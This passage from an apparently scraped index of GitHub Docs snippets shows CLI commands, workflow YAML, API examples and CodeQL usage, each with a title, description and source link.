docker.HOSTNAME/OWNER/REPOSITORY/IMAGE_NAME:VERSION\n```\n\nLANGUAGE: Shell\nCODE:\n```\ndocker push HOSTNAME/OWNER/REPOSITORY/IMAGE_NAME:VERSION\n```\n\n----------------------------------------\n\nTITLE: Initializing CodeQL Database for Indirect Build Tracing\nDESCRIPTION: This snippet initializes a CodeQL database for indirect build tracing. It creates scripts to set up an environment for tracing build commands. It relies on the `codeql database init` command with the `--begin-tracing` option. The user needs to specify the database path.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_21\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database init ... --begin-tracing <database>\n```\n\n----------------------------------------\n\nTITLE: Example: Overwriting Job Summary Content in PowerShell\nDESCRIPTION: This YAML configuration demonstrates how to overwrite the contents of the job summary. Appending with `>>` instead of outputting to a new file with `>` is used.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_49\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Overwrite Markdown\n  run: |\n    \"Adding some Markdown content\" >> $env:GITHUB_STEP_SUMMARY\n    \"There was an error, we need to clear the previous Markdown with some new content.\" >> $env:GITHUB_STEP_SUMMARY\n\n```\n\n----------------------------------------\n\nTITLE: Multiple Repository Qualifiers in Code Search\nDESCRIPTION: This snippet shows how to combine multiple `repo:` qualifiers with the boolean operator `OR` to search within a set of repositories.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_9\n\nLANGUAGE: text\nCODE:\n```\nrepo:github-linguist/linguist OR repo:tree-sitter/tree-sitter\n```\n\n----------------------------------------\n\nTITLE: Initializing Sinatra server with OAuth\nDESCRIPTION: This snippet initializes a Sinatra server, sets up environment variables for the client ID and client secret, and defines a route for the root path ('/') that renders an index view with the client ID. It depends on the 'sinatra', 'rest-client', and 'json' libraries.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/oauth-apps/building-oauth-apps/authenticating-to-the-rest-api-with-an-oauth-app.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nrequire 'sinatra'\nrequire 'rest-client'\nrequire 'json'\n\nCLIENT_ID = ENV['GH_BASIC_CLIENT_ID']\nCLIENT_SECRET = ENV['GH_BASIC_SECRET_ID']\n\nget '/' do\n  erb :index, :locals => {:client_id => CLIENT_ID}\nend\n```\n\n----------------------------------------\n\nTITLE: Listing X.509 keys with smimesign\nDESCRIPTION: Lists available X.509 keys that can be used for signing commits. This command uses the `smimesign` tool to retrieve and display the keys. The output includes details like the certificate ID, serial number, algorithm, validity, issuer, subject, and associated email addresses.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/x-509-key.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nsmimesign --list-keys\n```\n\n----------------------------------------\n\nTITLE: Troubleshooting: No such remote '[name]'\nDESCRIPTION: This snippet shows the error message when trying to change the URL of a remote that doesn't exist. It suggests checking that the remote name is typed correctly.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/managing-remote-repositories.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\n$ git remote set-url sofake https://{% data variables.product.product_url %}/octocat/Spoon-Knife\n> fatal: No such remote 'sofake'\n```\n\n----------------------------------------\n\nTITLE: Generating Migration Script using GitHub CLI\nDESCRIPTION: This command generates a migration script using the GitHub CLI's `gei` extension.  It requires the source and destination organizations as input and the desired output filename. It facilitates migrating multiple repositories. \nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-githubcom-to-github-enterprise-cloud.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\ngh gei generate-script --github-source-org SOURCE --github-target-org DESTINATION --output FILENAME\n```\n\n----------------------------------------\n\nTITLE: Switch Subversion Branch\nDESCRIPTION: This command switches the current working directory to a different branch. It is used to move between different branches to work on different features or bug fixes. Requires an existing svn checkout.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/working-with-subversion-on-github/support-for-subversion-clients.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nsvn switch https://github.com/USER/REPO/branches/more_awesome\n```\n\n----------------------------------------\n\nTITLE: Adding Diagnostic Information with CodeQL CLI (Shell)\nDESCRIPTION: This command adds a piece of diagnostic information to the specified directory. It requires the `--diagnostic-dir`, `--source-id`, and `--source-name` options to be provided.  It allows customization of the diagnostic message, severity, source, and location. This command is experimental and considered plumbing.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/diagnostic-add.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql diagnostic add (--diagnostic-dir=<diagnosticDir>) --source-id=<id> --source-name=<name> <options>...\n```\n\n----------------------------------------\n\nTITLE: Creating a Release using GitHub CLI\nDESCRIPTION: This snippet demonstrates how to create a release using the `gh release create` subcommand. It shows the basic command and an example with specified title, notes, and prerelease status. It requires the GitHub CLI to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/releasing-projects-on-github/managing-releases-in-a-repository.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh release create TAG\n```\n\nLANGUAGE: shell\nCODE:\n```\ngh release create v1.3.2 --title \"v1.3.2 (beta)\" --notes \"this is a {% data variables.release-phases.public_preview %} release\" --prerelease\n```\n\n----------------------------------------\n\nTITLE: Rendering Bar Graph with D3.js\nDESCRIPTION: This HTML and JavaScript snippet uses D3.js to render a bar graph of language frequencies. It receives the language data as a JSON array from the Ruby backend via ERB (`<%= languages %>`). The script creates SVG elements to represent the bars, labels, and axes of the graph. It requires the D3.js library.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/rendering-data-as-graphs.md#_snippet_6\n\nLANGUAGE: html\nCODE:\n```\n<!DOCTYPE html>\n<meta charset=\"utf-8\">\n<html>\n  <head>\n    <script src=\"//cdnjs.cloudflare.com/ajax/libs/d3/3.0.1/d3.v3.min.js\"></script>\n    <style>\n    svg {\n      padding: 20px;\n    }\n    rect {\n      fill: #2d578b\n    }\n    text {\n      fill: white;\n    }\n    text.yAxis {\n      font-size: 12px;\n      font-family: Helvetica, sans-serif;\n      fill: black;\n    }\n    </style>\n  </head>\n  <body>\n    <p>Check this sweet data out:</p>\n    <div id=\"lang_freq\"></div>\n\n  </body>\n  <script>\n    var data = <%= languages %>;\n\n    var barWidth = 40;\n    var width = (barWidth + 10) * data.length;\n    var height = 300;\n\n    var x = d3.scale.linear().domain([0, data.length]).range([0, width]);\n    var y = d3.scale.linear().domain([0, d3.max(data, function(datum) { return datum.count; })]).\n      rangeRound([0, height]);\n\n    // add the canvas to the DOM\n    var languageBars = d3.select(\"#lang_freq\").\n      append(\"svg:svg\").\n      attr(\"width\", width).\n      attr(\"height\", height);\n\n    languageBars.selectAll(\"rect\").\n      data(data).\n      enter().\n      append(\"svg:rect\").\n      attr(\"x\", function(datum, index) { return x(index); }).\n      attr(\"y\", function(datum) { return height - y(datum.count); }).\n      attr(\"height\", function(datum) { return y(datum.count); }).\n      attr(\"width\", barWidth);\n\n    languageBars.selectAll(\"text\").\n      data(data).\n      enter().\n      append(\"svg:text\").\n      attr(\"x\", function(datum, index) { return x(index) + barWidth; }).\n      attr(\"y\", function(datum) { return height - y(datum.count); }).\n      attr(\"dx\", -barWidth/2).\n      attr(\"dy\", \"1.2em\").\n      attr(\"text-anchor\", \"middle\").\n      text(function(datum) { return datum.count;});\n\n    languageBars.selectAll(\"text.yAxis\").\n      data(data).\n      enter().append(\"svg:text\").\n      attr(\"x\", function(datum, index) { return x(index) + barWidth; }).\n      attr(\"y\", height).\n      attr(\"dx\", -barWidth/2).\n      attr(\"text-anchor\", \"middle\").\n      text(function(datum) { return datum.language;}).\n      attr(\"transform\", \"translate(0, 18)\").\n      attr(\"class\", \"yAxis\");\n  </script>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_MERGE_REQUEST_TARGET_BRANCH_NAME to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_MERGE_REQUEST_TARGET_BRANCH_NAME` to the GitHub Actions equivalent `${{ github.event.pull_request.base.ref }}`. Target brach.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_70\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.event.pull_request.base.ref }}\n```\n\n----------------------------------------\n\nTITLE: Generating SSH Certificate with User ID Extension\nDESCRIPTION: This command generates an SSH certificate with an extension specifying the user ID, associating it with the corresponding GitHub user. The certificate validity is set to one day. This example is only shown for versions with ssh-ca-expires functionality.\nSOURCE: https://github.com/github/docs/blob/main/content/organizations/managing-git-access-to-your-organizations-repositories/about-ssh-certificate-authorities.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nssh-keygen -s ./ca-key -V '+1d' -I KEY-IDENTITY -O extension:id@{% data variables.product.product_url %}=ID ./user-key.pub\n```\n\n----------------------------------------\n\nTITLE: Java code snippet with empty if statement\nDESCRIPTION: This Java code snippet contains a `problem` method with an `if` statement that has an empty `then` block (a semicolon on the following line).  It also includes a `good` method which represents a non-vulnerable version.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/testing-custom-queries.md#_snippet_5\n\nLANGUAGE: java\nCODE:\n```\nclass Test {\n  public void problem(String arg) {\n    if (arg.isEmpty())\n      ;\n    {\n      System.out.println(\"Empty argument\");\n    }\n  }\n\n  public void good(String arg) {\n    if (arg.isEmpty()) {\n      System.out.println(\"Empty argument\");\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Runner Scale Sets with Helm (GHES)\nDESCRIPTION: This snippet demonstrates how to install runner scale sets using Helm for GitHub Enterprise Server (GHES), setting parameters like the installation name, namespace, GitHub configuration URL, and GitHub personal access token (PAT). It shows how to customize the installation with your specific GHES instance and specifies a namespace for the runner pods.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nINSTALLATION_NAME=\"arc-runner-set\"\nNAMESPACE=\"arc-runners\"\nGITHUB_CONFIG_URL=\"http(s)://<HOSTNAME>/<'enterprises/your_enterprise'/'org'/'org/repo'>\"\nGITHUB_PAT=\"<PAT>\"\nhelm install \"{% raw %}${INSTALLATION_NAME}{% endraw %}\" \\\n    --namespace \"{% raw %}${NAMESPACE}{% endraw %}\" \\\n    --create-namespace \\\n    --set githubConfigUrl=\"{% raw %}${GITHUB_CONFIG_URL}{% endraw %}\" \\\n    --set githubConfigSecret.github_token=\"{% raw %}${GITHUB_PAT}{% endraw %}\" \\\n    oci://ghcr.io/actions/actions-runner-controller-charts/gha-runner-scale-set\n```\n\n----------------------------------------\n\nTITLE: Get User/Org Node ID with REST API using gh\nDESCRIPTION: This snippet demonstrates how to retrieve the Node ID of a GitHub user or organization using the GitHub CLI (`gh`) and REST API. It requires replacing `GITHUB_OWNER` with the GitHub username. The `gh` CLI handles authentication.  `Accept` header specifies the API version.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_30\n\nLANGUAGE: shell\nCODE:\n```\ngh api -H \"Accept: application/vnd.github+json\" /users/GITHUB_OWNER\n```\n\n----------------------------------------\n\nTITLE: Making shell script executable and committing\nDESCRIPTION: These commands make the shell script executable, add it to the git repository, commits the changes, and prepares it for pushing.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_17\n\nLANGUAGE: shell\nCODE:\n```\nchmod +x decrypt_secret.sh\ngit add decrypt_secret.sh\ngit commit -m \"Add new decryption script\"\ngit push\n```\n\n----------------------------------------\n\nTITLE: Example output of smimesign --list-keys\nDESCRIPTION: Example output from running the `smimesign --list-keys` command. The output displays the ID, Serial Number, Algorithm, Validity, Issuer, Subject, and Emails associated with the listed X.509 key.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gpg/x-509-key.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\n$ smimesign --list-keys\n             ID: 0ff455a2708394633e4bb2f88002e3cd80cbd76f\n            S/N: a2dfa7e8c9c4d1616f1009c988bb70f\n      Algorithm: SHA256-RSA\n       Validity: 2017-11-22 00:00:00 +0000 UTC - 2020-11-22 12:00:00 +0000 UTC\n         Issuer: CN=DigiCert SHA2 Assured ID CA,OU=www.digicert.com,O=DigiCert Inc,C=US\n        Subject: CN=Octocat,O=GitHub\\, Inc.,L=San Francisco,ST=California,C=US\n         Emails: octocat@github.com\n```\n\n----------------------------------------\n\nTITLE: Displaying Database Migrations (Shell)\nDESCRIPTION: Executes the `ghe-migrations` utility to display the status of active database migrations during a feature release upgrade. This command requires no arguments and outputs the status of migrations in a table format.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_98\n\nLANGUAGE: shell\nCODE:\n```\nghe-migrations\n```\n\n----------------------------------------\n\nTITLE: Conditional Content Display (Liquid)\nDESCRIPTION: This Liquid snippet demonstrates a basic `ifversion` conditional. It checks if the GitHub product version matches any of the specified versions (fpt, ghes, ghae, or ghec). If the condition is true, the content \"Alpha\" will be rendered.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/unnecessary.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt or ghes or ghae or ghec %}\nAlpha\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Inviting Members to an Organization using PowerShell\nDESCRIPTION: This PowerShell script automates the process of inviting a large number of subscribers to an organization on GitHub Enterprise. It requires the GitHub CLI and appropriate permissions to invite members to the organization.  It is located in the `github/platform-samples` repository.\nSOURCE: https://github.com/github/docs/blob/main/content/billing/managing-billing-for-your-products/managing-licenses-for-visual-studio-subscriptions-with-github-enterprise/setting-up-visual-studio-subscriptions-with-github-enterprise.md#_snippet_0\n\nLANGUAGE: PowerShell\nCODE:\n```\nhttps://github.com/github/platform-samples/blob/master/api/powershell/invite_members_to_org.ps1\n```\n\n----------------------------------------\n\nTITLE: Checking HTTP Response Code with Curl\nDESCRIPTION: This code snippet uses the `curl` command to check the HTTP response code of a given URL. It sends a request to the specified URL and outputs the HTTP status code. A `200` response indicates success.\nSOURCE: https://github.com/github/docs/blob/main/src/links/lib/README.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncurl -Lso /dev/null -w \"%{http_code}\\n\" <em>URL</em>\n```\n\n----------------------------------------\n\nTITLE: Defining Authors in qlpack.yml (YAML)\nDESCRIPTION: This snippet shows how to define the authors metadata for a CodeQL pack, which is displayed on the packaging search page.  The `authors` property is a comma-separated list of author email addresses.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_16\n\nLANGUAGE: YAML\nCODE:\n```\nauthors: author1@github.com,author2@github.com\n```\n\n----------------------------------------\n\nTITLE: Defining Feature Versions in YAML\nDESCRIPTION: This YAML snippet demonstrates how to define the versions in which a feature is available. It specifies the short names of the versions and uses wildcards or version numbers to indicate availability.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/versioning-documentation.md#_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\nversions:\n  fpt: '*'\n  ghec: '*'\n  ghes: '>3.1'\n```\n\n----------------------------------------\n\nTITLE: Granting Migrator Role via GitHub CLI\nDESCRIPTION: This snippet demonstrates how to use the `gh ado2gh grant-migrator-role` command to grant the migrator role to a user or team within a GitHub organization.  It requires the {% data variables.product.prodname_ado2gh_cli %} to be installed and a {% data variables.product.pat_generic %} with appropriate permissions. The command takes the organization name, actor (user or team), and actor type as parameters.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-from-azure-devops-to-github-enterprise-cloud/managing-access-for-a-migration-from-azure-devops.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh ado2gh grant-migrator-role --github-org ORGANIZATION --actor ACTOR --actor-type TYPE\n```\n\n----------------------------------------\n\nTITLE: Avoid: Non-Unique Header Example\nDESCRIPTION: Illustrates the incorrect usage of duplicate headers at the same level.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_15\n\nLANGUAGE: Markdown\nCODE:\n```\n## Example prompts (H2)\n\nTEXT\n\n### Example (H3)\n\nTEXT\n\n### Example (H3)\n\nTEXT\n```\n\n----------------------------------------\n\nTITLE: Update Subversion Trunk to Current\nDESCRIPTION: This command updates the trunk branch to the latest revision, ensuring it's current before creating new branches. It's a precautionary step to synchronize the local trunk with the remote repository. Requires an existing svn checkout.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/working-with-subversion-on-github/support-for-subversion-clients.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\n$ svn up trunk\n> At revision 1.\n```\n\n----------------------------------------\n\nTITLE: Generating SHA-256 Hash (macOS/Linux)\nDESCRIPTION: This command generates a SHA-256 hash of a given token value using OpenSSL and base64 encoding. It is intended for use on macOS and Linux systems. Replace `TOKEN` with the actual token value you want to hash.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/audit_log/generating-hash-for-a-token.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\necho -n TOKEN | openssl dgst -sha256 -binary | base64\n```\n\n----------------------------------------\n\nTITLE: Switching to New Branch Based on a Pull Request\nDESCRIPTION: This snippet demonstrates how to switch to the newly created branch based on the fetched pull request.  The command changes the current branch to the one created in the previous step.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/reviewing-changes-in-pull-requests/checking-out-pull-requests-locally.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\n[main] $ git switch BRANCH_NAME\n> Switched to a new branch 'BRANCH_NAME'\n```\n\n----------------------------------------\n\nTITLE: Adding Disclaimer for Third-Party GitHub Actions in YAML\nDESCRIPTION: This YAML code block shows the disclaimer that must be included when using third-party GitHub Actions. It highlights that the actions are not certified by GitHub and are governed by separate terms of service and policies.  The disclaimer is included using the `{% raw %}{% data reusables.actions.actions-not-certified-by-github-comment %}{% endraw %}` reusable.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_30\n\nLANGUAGE: yaml\nCODE:\n```\n# This workflow uses actions that are not certified by {% data variables.product.company_short %}.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n```\n\n----------------------------------------\n\nTITLE: Creating a GitHub Enterprise Server instance on GCP using gcloud\nDESCRIPTION: This command creates a GitHub Enterprise Server instance on Google Cloud Platform using the gcloud compute command-line tool. It specifies the machine type, image, data disk, metadata, zone, and network. Replace `INSTANCE-NAME`, `GITHUB-ENTERPRISE-IMAGE-NAME`, `DATA-DISK-NAME`, `ZONE` and `NETWORK-NAME` with appropriate values.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-google-cloud-platform.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\n$ gcloud compute instances create INSTANCE-NAME \\\n--machine-type n1-standard-8 \\\n--image GITHUB-ENTERPRISE-IMAGE-NAME \\\n--disk name=DATA-DISK-NAME \\\n--metadata serial-port-enable=1 \\\n--zone ZONE \\\n--network NETWORK-NAME \\\n--image-project github-enterprise-public\n```\n\n----------------------------------------\n\nTITLE: YAML code block with Liquid data injection\nDESCRIPTION: This snippet demonstrates how to inject reusable content using the `data` Liquid tag within a YAML code block. It shows how the injected content is properly formatted and integrated into the YAML structure. Two different reusables are injected: `multiple_numbers` and `one_line_numbers`.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/liquid/data.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n```yaml copy\n{% data reusables.injectables.multiple_numbers %}\n\n{% data reusables.injectables.one_line_numbers %}\n\nname: Move assigned card\non:\n  issues:\n    types:\n      - assigned\n```\n```\n\n----------------------------------------\n\nTITLE: Mapping CI_JOB_NAME to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `CI_JOB_NAME` to the GitHub Actions equivalent `${{ github.job }}`. This is the unique id of the job.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_25\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.job }}\n```\n\n----------------------------------------\n\nTITLE: Verifying git-tfs Installation\nDESCRIPTION: Verifies that `git-tfs` is installed correctly by checking its version. This command ensures that `git-tfs` is available and that the environment is properly configured to use it. The expected output includes the version number and TFS client library information.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-a-team-foundation-version-control-repository.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngit tfs --version\n```\n\n----------------------------------------\n\nTITLE: Making a Request with the `rest` Method in JavaScript\nDESCRIPTION: This snippet demonstrates how to make a request using the `rest` method in Octokit.js. It uses the `octokit.rest.issues.listForRepo` method to list issues for a repository, passing the `owner`, `repo`, and `per_page` parameters.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-javascript.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nawait octokit.rest.issues.listForRepo({\n  owner: \"github\",\n  repo: \"docs\",\n  per_page: 2\n});\n```\n\n----------------------------------------\n\nTITLE: Making an API Request with Octokit.js\nDESCRIPTION: This snippet demonstrates how to make a request to a REST API endpoint using the authenticated `app` instance.  It uses the `octokit.request` method to make a GET request to the `/app` endpoint. This assumes you have already created an `App` instance.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/authenticating-with-a-github-app/authenticating-as-a-github-app.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nawait app.octokit.request(\"/app\")\n```\n\n----------------------------------------\n\nTITLE: Literals example - YAML\nDESCRIPTION: Shows how to use literals (null, boolean, number, string) within expressions in a GitHub Actions workflow. These literals are directly assigned to environment variables.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nenv:\n  myNull: ${{ null }}\n  myBoolean: ${{ false }}\n  myIntegerNumber: ${{ 711 }}\n  myFloatNumber: ${{ -9.2 }}\n  myHexNumber: ${{ 0xff }}\n  myExponentialNumber: ${{ -2.99e-2 }}\n  myString: Mona the Octocat\n  myStringInBraces: ${{ 'It''s open source!' }}\n```\n\n----------------------------------------\n\nTITLE: Defining Versions for Content - YAML\nDESCRIPTION: This snippet shows how to use the `versions` frontmatter property to specify which versions of GitHub the content applies to. It demonstrates examples for GitHub.com (fpt), GitHub Enterprise Server (ghes), and version ranges.\nSOURCE: https://github.com/github/docs/blob/main/content/README.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\ntitle: About your personal dashboard\nversions:\n  fpt: '*'\n  ghes: '>=2.20'\n```\n\nLANGUAGE: yaml\nCODE:\n```\ntitle: Downloading your license\nversions:\n  ghes: '*'\n```\n\nLANGUAGE: yaml\nCODE:\n```\nversions:\n  fpt: '*'\n  ghes: '>=2.22 <3.1'\n```\n\n----------------------------------------\n\nTITLE: Executing a workflow command using Write-Output in PowerShell\nDESCRIPTION: This snippet shows how to execute a workflow command in PowerShell using the `Write-Output` cmdlet.  Similar to the bash example, it takes parameters and a command value as a string. The parameters are optional, and the command value represents the core functionality.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\nWrite-Output \"::workflow-command parameter1={data},parameter2={data}::{command value}\"\n```\n\n----------------------------------------\n\nTITLE: Checking SSH Host Keys with ghe-ssh-check-host-keys (Shell)\nDESCRIPTION: The `ghe-ssh-check-host-keys` utility checks existing SSH host keys against a list of known leaked SSH host keys. It exits with a status code of `1` if a leaked key is found and `0` otherwise.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_22\n\nLANGUAGE: shell\nCODE:\n```\nghe-ssh-check-host-keys\n```\n\nLANGUAGE: shell\nCODE:\n```\n> One or more of your SSH host keys were found in the blacklist.\n> Please reset your host keys using ghe-ssh-roll-host-keys.\n```\n\nLANGUAGE: shell\nCODE:\n```\n> The SSH host keys were not found in the SSH host key blacklist.\n> No additional steps are needed/recommended at this time.\n```\n\n----------------------------------------\n\nTITLE: Defining Environment by Name - YAML\nDESCRIPTION: This snippet shows how to define a job's environment by simply specifying its name. This is the simplest way to reference a pre-configured environment within your GitHub Actions workflow. The environment `staging_environment` should already exist in the repository's settings.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/section-using-environments-for-jobs.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nenvironment: staging_environment\n```\n\n----------------------------------------\n\nTITLE: Debugging TypeError with Copilot\nDESCRIPTION: This prompt is designed to be used with GitHub Copilot Chat to debug a Python code error. It instructs Copilot to explain the cause of the 'TypeError: can only concatenate str (not \"int\") to str' and suggest a fix.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/learning-to-debug-with-github-copilot.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nExplain in depth why my code produces the following error and how I can fix it:\n\nTypeError: can only concatenate str (not \"int\") to str\n```\n\n----------------------------------------\n\nTITLE: Installing Gems with Bundler (Shell)\nDESCRIPTION: This command installs the gems specified in the `Gemfile`. It also creates a `Gemfile.lock` file, which records the exact versions of the installed gems. This ensures consistent dependencies across different environments.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-login-with-github-button-with-a-github-app.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbundle install\n```\n\n----------------------------------------\n\nTITLE: Conditional Version Check with Else Clause\nDESCRIPTION: This snippet includes an `else` clause within the `ifversion` block, allowing for different content to be displayed depending on the version condition. It renders 'Alpha' if `ghes < 2.14`, otherwise 'Bravo'.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/whitespace.md#_snippet_5\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes < 2.14 %}\nAlpha\n{% else %}\nBravo\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Fetching follower logins with GraphQL\nDESCRIPTION: This GraphQL query fetches the login of ten of the viewer's followers, and the login of ten followers of each of those followers. It demonstrates the ability of GraphQL to retrieve nested data with a single request.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/about-the-rest-api/comparing-githubs-rest-api-and-graphql-api.md#_snippet_0\n\nLANGUAGE: graphql\nCODE:\n```\n{\n  viewer {\n    followers(first: 10) {\n      nodes {\n        login\n        followers(first: 10) {\n          nodes {\n            login\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying organization databaseId with GraphQL\nDESCRIPTION: This GraphQL query retrieves the `databaseId` of an organization using its login. The `login` variable needs to be replaced with the actual organization login. This ID is later used for configuring Azure resources.\nSOURCE: https://github.com/github/docs/blob/main/content/organizations/managing-organization-settings/configuring-private-networking-for-github-hosted-runners-in-your-organization.md#_snippet_0\n\nLANGUAGE: graphql\nCODE:\n```\nquery(\n  $login: String!\n){\n  organization (login: $login)\n  {\n    login\n    databaseId\n  }\n}\n'\nVariables\n{\n  \"login\": \"ORGANIZATION_LOGIN\"\n}\n```\n\n----------------------------------------\n\nTITLE: Unsuspending User via Command Line\nDESCRIPTION: This code snippet demonstrates the command to unsuspend a user on GitHub Enterprise Server using the `ghe-user-unsuspend` utility. Replace `USERNAME` with the actual username of the user to be unsuspended. This command must be run via SSH on the GitHub Enterprise Server instance.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-users-in-your-enterprise/suspending-and-unsuspending-users.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nghe-user-unsuspend USERNAME\n```\n\n----------------------------------------\n\nTITLE: Trigger workflow on pull request events with specific types (YAML)\nDESCRIPTION: This snippet demonstrates how to configure a GitHub Actions workflow to run when a pull request is opened or reopened. It uses the `pull_request` event trigger with the `types` keyword to specify the desired activity types.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_22\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  pull_request:\n    types: [opened, reopened]\n```\n\n----------------------------------------\n\nTITLE: Calling Workflow in Another Repository (Tag)\nDESCRIPTION: This snippet calls a workflow named 'workflow.yml' located in the '.github/workflows' directory of the 'octo-org/another-repo' repository, using a tag ('v1'). It demonstrates how to reference a specific release version of the workflow.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/uses-keyword-example.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  call-workflow-in-another-repo:\n    uses: 